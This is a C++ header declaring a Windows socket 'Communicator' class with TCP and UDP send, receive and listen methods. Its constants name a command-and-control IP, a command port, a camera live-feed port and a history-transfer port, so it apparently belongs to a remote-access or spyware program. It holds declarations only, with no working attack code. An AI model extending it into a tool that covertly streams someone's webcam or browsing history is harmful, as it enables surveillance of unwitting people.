#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <string>
#include <queue>
#include <WS2tcpip.h>
#include <iostream>

#define CC_IP "127.0.0.1"
#define COMMAND_LISTEN_PORT 1337
#define CAMERA_LIVEFEED_PORT 7777
#define HISTORY_TRANSFER_PORT 4180
#define RECV_TCP_BUFFER_SIZE 1024
#define UDP_PACKET_BUFFER_SIZE 8192
#define TCP_PACKET_BUFFER_SIZE 4096
#define COMMANDS_SEPERATOR '\n'

class Communicator
{
public:
	Communicator();
	~Communicator();

	class Message {
	public:
		Message(char * data);
		~Message();
		std::string getData();

	private:
		std::string data;
	};

	class TCP {
	public:
		static SOCKET createSocket();
		static void bindAndListen(SOCKET tcp_soc, const int listen_port);
		static SOCKET acceptClient(SOCKET server_soc);
		static SOCKET connect(SOCKET tcp_soc, char server_ip[16], int server_port);
		static Communicator::Message recvFromClient(SOCKET client_soc);
		static void Send(SOCKET tcp_soc, const char *info, int len);
		static SOCKET destroySocket(SOCKET soc);
	};

	class UDP {
	public:
		static SOCKET createSocket();
		static SOCKET destroySocket(SOCKET soc);
		static void Send(SOCKET udp_soc, int port, const void *info, int len);
	};

private:
	static void WSAInitializer();
	static void WSADestructor();
};
